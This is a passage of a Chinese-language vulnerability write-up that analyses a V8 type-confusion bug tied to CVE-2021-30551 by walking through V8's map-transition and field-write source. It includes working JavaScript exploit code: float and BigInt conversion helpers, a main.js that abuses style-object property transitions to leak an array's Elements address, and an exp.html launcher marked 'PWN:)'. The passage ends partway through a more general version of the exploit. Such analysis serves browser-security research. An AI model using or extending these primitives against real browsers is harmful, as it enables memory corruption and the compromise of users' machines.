  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSReceiver</span><span class="o">&gt;</span> <span class="n">holder</span> <span class="o">=</span> <span class="n">GetHolder</span><span class="o">&lt;</span><span class="n">JSReceiver</span><span class="o">&gt;</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">IsElement</span><span class="p">(</span><span class="o">*</span><span class="n">holder</span><span class="p">))</span> <span class="p">{</span>
	<span class="p">...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">holder</span><span class="o">-&gt;</span><span class="n">HasFastProperties</span><span class="p">(</span><span class="n">isolate_</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">DCHECK</span><span class="p">(</span><span class="n">holder</span><span class="o">-&gt;</span><span class="n">IsJSObject</span><span class="p">(</span><span class="n">isolate_</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">property_details_</span><span class="p">.</span><span class="n">location</span><span class="p">()</span> <span class="o">==</span> <span class="n">PropertyLocation</span><span class="o">::</span><span class="n">kField</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// Check that in case of VariableMode::kConst field the existing value is</span>
      <span class="c1">// equal to |value|.</span>
      <span class="n">DCHECK_IMPLIES</span><span class="p">(</span><span class="o">!</span><span class="n">initializing_store</span> <span class="o">&amp;&amp;</span> <span class="n">property_details_</span><span class="p">.</span><span class="n">constness</span><span class="p">()</span> <span class="o">==</span>
                                                <span class="n">PropertyConstness</span><span class="o">::</span><span class="n">kConst</span><span class="p">,</span>
                     <span class="n">IsConstFieldValueEqualTo</span><span class="p">(</span><span class="o">*</span><span class="n">value</span><span class="p">));</span>
      <span class="n">JSObject</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="o">*</span><span class="n">holder</span><span class="p">).</span><span class="n">WriteToField</span><span class="p">(</span><span class="n">descriptor_number</span><span class="p">(),</span>
                                           <span class="n">property_details_</span><span class="p">,</span> <span class="o">*</span><span class="n">value</span><span class="p">);</span> <span class="c1">/// &lt;&lt;&lt; 关键点</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="p">...</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">holder</span><span class="o">-&gt;</span><span class="n">IsJSGlobalObject</span><span class="p">(</span><span class="n">isolate_</span><span class="p">))</span> <span class="p">{</span>
	<span class="p">...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="p">...</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">JSObject</span><span class="o">::</span><span class="n">WriteToField</span><span class="p">(</span><span class="n">InternalIndex</span> <span class="n">descriptor</span><span class="p">,</span> <span class="n">PropertyDetails</span> <span class="n">details</span><span class="p">,</span>
                            <span class="n">Object</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">PropertyLocation</span><span class="o">::</span><span class="n">kField</span><span class="p">,</span> <span class="n">details</span><span class="p">.</span><span class="n">location</span><span class="p">());</span>
  <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">PropertyKind</span><span class="o">::</span><span class="n">kData</span><span class="p">,</span> <span class="n">details</span><span class="p">.</span><span class="n">kind</span><span class="p">());</span>
  <span class="n">DisallowGarbageCollection</span> <span class="n">no_gc</span><span class="p">;</span>
  <span class="n">FieldIndex</span> <span class="n">index</span> <span class="o">=</span> <span class="n">FieldIndex</span><span class="o">::</span><span class="n">ForDescriptor</span><span class="p">(</span><span class="n">map</span><span class="p">(),</span> <span class="n">descriptor</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">details</span><span class="p">.</span><span class="n">representation</span><span class="p">().</span><span class="n">IsDouble</span><span class="p">())</span> <span class="p">{</span>
    <span class="c1">// Manipulating the signaling NaN used for the hole and uninitialized</span>
    <span class="c1">// double field sentinel in C++, e.g. with bit_cast or value()/set_value(),</span>
    <span class="c1">// will change its value on ia32 (the x87 stack is used to return values</span>
    <span class="c1">// and stores to the stack silently clear the signalling bit).</span>
    <span class="kt">uint64_t</span> <span class="n">bits</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="n">IsSmi</span><span class="p">())</span> <span class="p">{</span>
      <span class="n">bits</span> <span class="o">=</span> <span class="n">bit_cast</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="o">&gt;</span><span class="p">(</span><span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Smi</span><span class="o">::</span><span class="n">ToInt</span><span class="p">(</span><span class="n">value</span><span class="p">)));</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="n">IsUninitialized</span><span class="p">())</span> <span class="p">{</span>
      <span class="n">bits</span> <span class="o">=</span> <span class="n">kHoleNanInt64</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">DCHECK</span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="n">IsHeapNumber</span><span class="p">());</span> <span class="c1">/// DCHECK 是类似 assert 的操作，发布版不生效</span>
      <span class="n">bits</span> <span class="o">=</span> <span class="n">HeapNumber</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="n">value</span><span class="p">).</span><span class="n">value_as_bits</span><span class="p">(</span><span class="n">kRelaxedLoad</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">auto</span> <span class="n">box</span> <span class="o">=</span> <span class="n">HeapNumber</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="n">RawFastPropertyAt</span><span class="p">(</span><span class="n">index</span><span class="p">));</span>
    <span class="n">box</span><span class="p">.</span><span class="n">set_value_as_bits</span><span class="p">(</span><span class="n">bits</span><span class="p">,</span> <span class="n">kRelaxedStore</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">FastPropertyAtPut</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>从 LookupIterator::ApplyTransitionToDataProperty 函数可以看到当 simple_transition 为 false， 也就是 transition map 的父 map，不是当前 receiver 的 map 时，程序才会走到上面所说的可利用的控制流上，那么怎么才能触发这个条件呢？这就需要看 transition map 的创建过程了，如果单步调试过这一段流程，可以知道 transition map 是在之前的 LookupIterator::PrepareTransitionToDataProperty -&gt; Map::TransitionToDataProperty 这一段控制流中创建的。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">PrepareTransitionToDataProperty</span><span class="p">(</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSReceiver</span><span class="o">&gt;</span> <span class="n">receiver</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
    <span class="n">PropertyAttributes</span> <span class="n">attributes</span><span class="p">,</span> <span class="n">StoreOrigin</span> <span class="n">store_origin</span><span class="p">)</span> <span class="p">{</span>

  <span class="p">...</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">map</span><span class="p">(</span><span class="n">receiver</span><span class="o">-&gt;</span><span class="n">map</span><span class="p">(</span><span class="n">isolate_</span><span class="p">),</span> <span class="n">isolate_</span><span class="p">);</span>

  <span class="p">...</span>

  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">transition</span> <span class="o">=</span>
      <span class="n">Map</span><span class="o">::</span><span class="n">TransitionToDataProperty</span><span class="p">(</span><span class="n">isolate_</span><span class="p">,</span> <span class="n">map</span><span class="p">,</span> <span class="n">name_</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">attributes</span><span class="p">,</span>
                                    <span class="n">PropertyConstness</span><span class="o">::</span><span class="n">kConst</span><span class="p">,</span> <span class="n">store_origin</span><span class="p">);</span>
  <span class="n">state_</span> <span class="o">=</span> <span class="n">TRANSITION</span><span class="p">;</span>
  <span class="n">transition_</span> <span class="o">=</span> <span class="n">transition</span><span class="p">;</span>
  <span class="p">...</span>
<span class="p">}</span>

<span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">Map</span><span class="o">::</span><span class="n">TransitionToDataProperty</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">map</span><span class="p">,</span>
                                          <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span>
                                          <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
                                          <span class="n">PropertyAttributes</span> <span class="n">attributes</span><span class="p">,</span>
                                          <span class="n">PropertyConstness</span> <span class="n">constness</span><span class="p">,</span>
                                          <span class="n">StoreOrigin</span> <span class="n">store_origin</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>

  <span class="c1">// Migrate to the newest map before storing the property.</span>
  <span class="n">map</span> <span class="o">=</span> <span class="n">Update</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">map</span><span class="p">);</span>

  <span class="n">Map</span> <span class="n">maybe_transition</span> <span class="o">=</span>
      <span class="n">TransitionsAccessor</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">map</span><span class="p">)</span>
          <span class="p">.</span><span class="n">SearchTransition</span><span class="p">(</span><span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="n">PropertyKind</span><span class="o">::</span><span class="n">kData</span><span class="p">,</span> <span class="n">attributes</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">maybe_transition</span><span class="p">.</span><span class="n">is_null</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">transition</span><span class="p">(</span><span class="n">maybe_transition</span><span class="p">,</span> <span class="n">isolate</span><span class="p">);</span>
    <span class="n">InternalIndex</span> <span class="n">descriptor</span> <span class="o">=</span> <span class="n">transition</span><span class="o">-&gt;</span><span class="n">LastAdded</span><span class="p">();</span>

    <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">attributes</span><span class="p">,</span> <span class="n">transition</span><span class="o">-&gt;</span><span class="n">instance_descriptors</span><span class="p">(</span><span class="n">isolate</span><span class="p">)</span>
                              <span class="p">.</span><span class="n">GetDetails</span><span class="p">(</span><span class="n">descriptor</span><span class="p">)</span>
                              <span class="p">.</span><span class="n">attributes</span><span class="p">());</span>

    <span class="k">return</span> <span class="n">UpdateDescriptorForValue</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">transition</span><span class="p">,</span> <span class="n">descriptor</span><span class="p">,</span> <span class="n">constness</span><span class="p">,</span>
                                    <span class="n">value</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// Do not track transitions during bootstrapping.</span>
  <span class="n">TransitionFlag</span> <span class="n">flag</span> <span class="o">=</span>
      <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">bootstrapper</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">IsActive</span><span class="p">()</span> <span class="o">?</span> <span class="n">OMIT_TRANSITION</span> <span class="o">:</span> <span class="n">INSERT_TRANSITION</span><span class="p">;</span>
  <span class="n">MaybeHandle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">maybe_map</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">TooManyFastProperties</span><span class="p">(</span><span class="n">store_origin</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">Representation</span> <span class="n">representation</span> <span class="o">=</span> <span class="n">value</span><span class="o">-&gt;</span><span class="n">OptimalRepresentation</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">FieldType</span><span class="o">&gt;</span> <span class="n">type</span> <span class="o">=</span> <span class="n">value</span><span class="o">-&gt;</span><span class="n">OptimalType</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">representation</span><span class="p">);</span>
    <span class="n">maybe_map</span> <span class="o">=</span> <span class="n">Map</span><span class="o">::</span><span class="n">CopyWithField</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">map</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="n">attributes</span><span class="p">,</span>
                                   <span class="n">constness</span><span class="p">,</span> <span class="n">representation</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">maybe_map</span><span class="p">.</span><span class="n">ToHandle</span><span class="p">(</span><span class="o">&amp;</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
      <span class="p">...</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">Map</span><span class="o">::</span><span class="n">Normalize</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">map</span><span class="p">,</span> <span class="n">CLEAR_INOBJECT_PROPERTIES</span><span class="p">,</span> <span class="n">reason</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="err">}</span>

<span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">Map</span><span class="o">::</span><span class="n">Update</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">map</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">is_deprecated</span><span class="p">())</span> <span class="k">return</span> <span class="n">map</span><span class="p">;</span>
  <span class="p">...</span>
  <span class="n">MapUpdater</span> <span class="n">mu</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">map</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">mu</span><span class="p">.</span><span class="n">Update</span><span class="p">();</span>
<span class="p">}</span>

</code></pre></div></div>

<p>结合代码可知一般情况下，transition map 的创建动作，就是先拷贝一份 receiver 的 map ，再追加上新属性的属性描述符。但是如果当前 receiver 的 map 已经被打上了 deprecated 标记了，情况就有所不同，这种情况下 receiver 现有的 map 已经废弃了，要先用 MapUpdater 寻找/创建一个更合适的 map 作为 transition map 的父 map，这样一来 transition 的父 map 就不是 receiver 原本的 map（MapUpdater 并不会更新 receiver 的 map），最终导致 simple_transition 为 false。</p>

<p>那么问题就又变成了，怎么才能让 receiver 的 map 被打上 deprecated 标记呢？先在代码里搜索一下看看哪里会修改 map 的 deprecated 字段。查看 is_deprecated 的函数定义可以得知，函数是用 BIT_FIELD_ACCESSORS 宏定义的，这个宏还定义了修改函数 set_is_deprecated，搜索 set_is_deprecated 字符串发现函数 Map::DeprecateTransitionTree 中有调用，再搜索 DeprecateTransitionTree 的调用，可以搜到 MapUpdater::ConstructNewMap，再向上搜索找到 MapUpdater::ReconfigureToDataField、MapUpdater::ReconfigureElementsKind。通过分析这两个函数的定义和引用的地方，结合 CVE-2021-30551 的 POC 可以推测出，这两个函数是在修改对象已有属性类型、数组元素类型时触发的，CVE-2021-30551 采用的是触发 ReconfigureToDataField 这条代码路径 SetPropertyInternal -&gt; PrepareForDataProperty -&gt; PrepareForDataProperty -&gt; UpdateDescriptorForValue -&gt; ReconfigureToDataField。（另一条路径是否可行?）</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">Map</span><span class="o">::</span><span class="n">DeprecateTransitionTree</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_deprecated</span><span class="p">())</span> <span class="k">return</span><span class="p">;</span>
  <span class="n">DisallowGarbageCollection</span> <span class="n">no_gc</span><span class="p">;</span>
  <span class="n">TransitionsAccessor</span> <span class="n">transitions</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="o">*</span><span class="k">this</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">no_gc</span><span class="p">);</span>
  <span class="kt">int</span> <span class="n">num_transitions</span> <span class="o">=</span> <span class="n">transitions</span><span class="p">.</span><span class="n">NumberOfTransitions</span><span class="p">();</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_transitions</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">transitions</span><span class="p">.</span><span class="n">GetTarget</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">DeprecateTransitionTree</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">constructor_or_back_pointer</span><span class="p">().</span><span class="n">IsFunctionTemplateInfo</span><span class="p">());</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">CanBeDeprecated</span><span class="p">());</span>
  <span class="n">set_is_deprecated</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">FLAG_log_maps</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">MapEvent</span><span class="p">(</span><span class="s">"Deprecate"</span><span class="p">,</span> <span class="n">handle</span><span class="p">(</span><span class="o">*</span><span class="k">this</span><span class="p">,</span> <span class="n">isolate</span><span class="p">),</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span><span class="p">()));</span>
  <span class="p">}</span>
  <span class="n">dependent_code</span><span class="p">().</span><span class="n">DeoptimizeDependentCodeGroup</span><span class="p">(</span>
      <span class="n">isolate</span><span class="p">,</span> <span class="n">DependentCode</span><span class="o">::</span><span class="n">kTransitionGroup</span><span class="p">);</span>
  <span class="n">NotifyLeafMapLayoutChange</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>具体操作是在 s2 的两次 prop 属性设置之间，通过给 s1 的 prop 属性赋值的方式，修改 s1 的 prop 属性的类型。这样 s1 的旧 map 会被标记为 deptecate，因为 s1 和 s2 是共享同一个 map 的，s2 当前使用的 map 就变成 deprecate 的了，等 s2 的第二次 prop 赋值时，由于 map 被打上了 deprecated 标记，就走入了非 simple_transition 的代码路径。</p>

<p>利用代码如下：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">s2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>
<span class="nx">v2</span> <span class="o">=</span> <span class="p">{</span> <span class="na">toString</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nx">s2</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">s1</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span> <span class="p">};</span>
<span class="nx">s2</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="nx">v2</span><span class="p">;</span>
</code></pre></div></div>

<hr />
<p>⚠️ 提示：不清楚 s1 和 s2 为什么共享同一个 map 的同学，可以去了解一下 v8 中 map transition 的相关内容，我在 <a href="/2022/04/30/CVE-2021-30551.html">CVE-2021-30551 分析</a> 这篇的”分析 map 的变化过程”这一小节也有简单介绍。</p>

<hr />

<p>在属性访问的时候也是用同一个线性搜索算法，所以之后访问对象的 prop 属性，实际访问的都是存储在第一个 prop 属性处的值，对于 s1 来说是第一次 WriteToField 写入的，对于 s2 来说是第二次。</p>

<p>分析 JSObject::WriteToField 代码，结合上 CVE-2021-30551 的利用经验，可以很容易想到，如果把 v2 改成一个数组的话，就可以直接通过 s2.prop 读取到数组的 Elements。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">s2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">v2</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>
<span class="nx">v2</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span>  <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nx">s2</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mi">1</span>
	<span class="nx">s1</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mf">1.1</span>
<span class="p">};</span>
<span class="nx">s2</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="nx">v2</span><span class="p">;</span>
</code></pre></div></div>

<p>实际验证下效果，验证过程中还要用到一些浮点数和大整数之间的类型转换，我这次把它封装成了模块 conversion.mjs，方便以后复用。</p>

<p>完整代码如下：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// conversion.mjs</span>
<span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">f64</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">u64</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">u32</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">ftou</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">;</span>
	<span class="k">return</span> <span class="nx">u64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">utof</span><span class="p">(</span><span class="nx">u</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">u64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u</span><span class="p">;</span>
	<span class="k">return</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">low32</span><span class="p">(</span><span class="nx">u</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">u64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u</span><span class="p">;</span>
	<span class="k">return</span> <span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">high32</span><span class="p">(</span><span class="nx">u</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">u64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">u</span><span class="p">;</span>
	<span class="k">return</span> <span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">export</span> <span class="p">{</span><span class="nx">ftou</span><span class="p">,</span> <span class="nx">utof</span><span class="p">,</span> <span class="nx">low32</span><span class="p">,</span> <span class="nx">high32</span><span class="p">};</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// main.js</span>
<span class="k">import</span> <span class="o">*</span> <span class="k">as</span> <span class="nx">cvs</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./module/conversion.mjs</span><span class="dl">'</span>

<span class="kd">var</span> <span class="nx">s1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">v1</span> <span class="o">=</span> <span class="p">{</span> <span class="na">toString</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nx">s1</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mi">1</span><span class="p">}</span> <span class="p">};</span>
<span class="nx">s1</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="nx">v1</span><span class="p">;</span>


<span class="kd">var</span> <span class="nx">s2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">v2</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>
<span class="nx">v2</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span>  <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nx">s2</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mi">1</span>
	<span class="nx">s1</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mf">1.1</span>
<span class="p">};</span>

<span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="nx">s2</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="nx">v2</span><span class="p">;</span>

<span class="nx">alert</span><span class="p">(</span><span class="s2">`0x</span><span class="p">${</span><span class="nx">cvs</span><span class="p">.</span><span class="nx">ftou</span><span class="p">(</span><span class="nx">s2</span><span class="p">.</span><span class="nx">prop</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--exp.html--&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"module"</span> <span class="na">src=</span><span class="s">"./main.js"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;/script&gt;</span>
		PWN:)
	<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<hr />
<p>⚠️提示：浏览器原生支持的模块的用法参考 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules">MDN</a>，也可以用Typescript，Babel 提供的模块机制。</p>

<hr />
<p>如下图所示，读取到的结果和调试器中看到的 v2 的内容一致。</p>

<p>![[Pasted image 20221205000128.png]]</p>

<p>光能泄漏一个数组 Elements 的地址还是不够的，还需要进一步的转化获得一个修改什么数据的能力。先借鉴 CVE-2021-30551 POC 中的思路，优化一下上面的利用代码，引入一个新的属性 deprecate 来专门触发 map 废弃，这样 prop 就可以支持更多的数据类型之间的混淆了，代码修改如下：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// main.js</span>
<span class="k">import</span> <span class="o">*</span> <span class="k">as</span> <span class="nx">cvs</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./module/conversion.mjs</span><span class="dl">'</span>                  

<span class="kd">const</span> <span class="nx">smi_value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>                                            
<span class="kd">const</span> <span class="nx">double_value</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>                                       

<span class="kd">var</span> <span class="nx">s1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>                     
<span class="kd">var</span> <span class="nx">v1</span> <span class="o">=</span> <span class="p">{</span>                                                      
